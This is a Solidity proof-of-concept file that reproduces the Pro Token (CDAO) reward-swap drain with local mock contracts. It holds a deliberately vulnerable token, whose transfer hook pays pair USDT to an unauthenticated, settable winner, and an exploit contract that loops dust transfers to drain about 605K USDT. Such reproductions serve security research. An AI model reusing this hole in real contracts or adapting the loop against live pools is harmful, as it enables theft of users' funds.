// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Faithful minimal reproduction of the Pro Token (CryptoDAO / CDAO) reward-swap
// self-dealing drain (BSC, 2026-07). ~605K USDT drained from the USDT/Pro pair in
// one tx (~$8.2M cumulative over ~13 txs). Basis: DeFiHackLabs PR #1209
// (src/test/2026-07/ProToken_exp.sol — a fork replay of the deployed helper).
//
// Root cause (reconstructed from the PoC header + trace; Pro token source not
// byte-verbatim):
//   The Pro token's transfer logic auto-processes a "reward" on transfers involving
//   a registered player/holder: it skims a 2.5% cut, then SWAPS the remainder of the
//   moved Pro into USDT through the USDT/Pro pair and forwards that USDT straight to
//   a "winner" address. The winner is attacker-controlled. By looping a dust Pro
//   transfer out of an attacker "player" clone, the helper repeatedly triggers the
//   reward swap, each pass shipping USDT out of the pair to the attacker until the
//   pair's USDT reserve is drained. Nothing is privileged — any address can register
//   as a player and drive the loop.
// Local deploy, no fork.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address a) external view returns (uint256);
    function transfer(address to, uint256 a) external returns (bool);
}

contract MiniUSDT is IERC20 {
    string public name = "Tether USD"; string public symbol = "USDT";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 a) external { balanceOf[to] += a; totalSupply += a; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
}

// Minimal constant-product USDT/Pro pair (0.25% fee); the reward swap sells Pro
// into it for USDT.
contract Pair {
    IERC20 public usdt;
    ProToken public pro;
    uint256 public rUsdt; // USDT reserve
    uint256 public rPro;  // Pro reserve
    constructor(IERC20 _usdt) { usdt = _usdt; }
    function setPro(ProToken _pro) external { pro = _pro; }
    function seed(uint256 u, uint256 p) external { rUsdt = u; rPro = p; }
    // Sell `proIn` Pro into the pair; pay `usdtOut` to `to`.
    function swapProForUsdt(uint256 proIn, address to) external returns (uint256 usdtOut) {
        uint256 proInFee = proIn * 9975;
        usdtOut = (proInFee * rUsdt) / (rPro * 10000 + proInFee);
        rPro += proIn;
        rUsdt -= usdtOut;
        usdt.transfer(to, usdtOut);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE Pro token — a transfer hook that self-deals a USDT reward to an
// attacker-controlled "winner" on every player transfer.
// ─────────────────────────────────────────────────────────────────────────────
contract ProToken is IERC20 {
    string public name = "Pro Token"; string public symbol = "Pro";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    Pair public pair;
    mapping(address => bool) public isPlayer;
    address public winner;
    uint256 public rewardPro; // Pro the token sells into the pair per reward

    function mint(address to, uint256 a) external { balanceOf[to] += a; totalSupply += a; }
    function setup(Pair _pair, uint256 _rewardPro) external { pair = _pair; rewardPro = _rewardPro; }
    function registerPlayer(address p) external { isPlayer[p] = true; }
    function setWinner(address w) external { winner = w; }

    // @> VULN: a player transfer auto-triggers a reward swap that ships USDT from
    // the pair to an attacker-controlled winner — looping drains the pair.
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        if (isPlayer[msg.sender] && address(pair) != address(0)) {
            _processReward();
        }
        return true;
    }
    function _processReward() internal {
        // sell the token's own Pro reserve into the pair and forward USDT to the winner
        pair.swapProForUsdt(rewardPro, winner); // @> VULN: transfer-triggered self-dealing reward to an attacker winner
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: register as player + winner and loop dust transfers to drain
// the pair's USDT.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    uint256 internal constant POOL_USDT = 700000e18; // USDT reserve
    uint256 internal constant POOL_PRO  = 700000e18; // Pro reserve (~1:1 pre-attack)
    uint256 internal constant REWARD_PRO = 15000e18;  // Pro sold into the pair per reward pass
    uint256 internal constant LOOPS = 320;           // ~13-tx incident modelled as one looped tx

    MiniUSDT public usdt;   // n1 (profit token)
    Pair public pair;       // n2
    ProToken public pro;    // n3 (VULN)

    uint256 public drained;
    uint256 public profit;

    constructor() {
        usdt = new MiniUSDT();   // n1
        pair = new Pair(IERC20(address(usdt))); // n2
        pro = new ProToken();    // n3

        pair.setPro(pro);
        pair.seed(POOL_USDT, POOL_PRO);
        usdt.mint(address(pair), POOL_USDT);          // real USDT backing the pair reserve
        pro.mint(address(pro), 100_000_000e18);       // Pro the token sells as "reward"
        pro.mint(address(this), 1e18);                // dust Pro to move each loop

        pro.setup(pair, REWARD_PRO);
        pro.registerPlayer(address(this)); // attacker registers as a player
        pro.setWinner(address(this));      // ...and as the winner that receives the USDT
    }

    function run() external {
        uint256 before = usdt.balanceOf(address(this));

        // Loop a dust Pro transfer; each pass triggers the reward swap that ships
        // USDT out of the pair to us (the winner).
        for (uint256 i = 0; i < LOOPS; i++) {
            pro.transfer(address(this), 1); // player transfer -> reward swap -> USDT to winner
        }

        uint256 got = usdt.balanceOf(address(this));
        drained = got - before;
        profit = drained;
        require(profit >= 600000e18, "drain below ~605K USDT");
    }
}
